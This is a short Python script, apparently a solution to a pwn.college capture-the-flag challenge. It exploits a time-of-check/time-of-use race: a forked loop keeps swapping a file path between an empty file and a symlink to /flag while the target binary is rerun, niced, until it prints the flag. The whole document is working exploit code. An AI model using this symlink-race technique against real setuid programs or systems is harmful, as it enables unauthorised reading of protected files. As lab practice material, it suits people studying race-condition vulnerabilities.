#!/bin/python

import os
import sys
import time
from pwn import * 

#context.log_level = 'error'
context.arch = 'amd64'

FILE = '/home/hacker/file'
argv = ['nice', '-n19', sys.argv[1], FILE]


if not os.fork():
    while True:
        os.unlink(FILE)
        with open(FILE, "w") as f: 
            pass
        os.unlink(FILE)
        os.symlink('/flag', FILE)


while True:
    proc = process(argv)
    try: 
        proc.recvuntil(b"pwn.college", timeout=1)
        print(proc.recvline())
        break
    except:
        pass


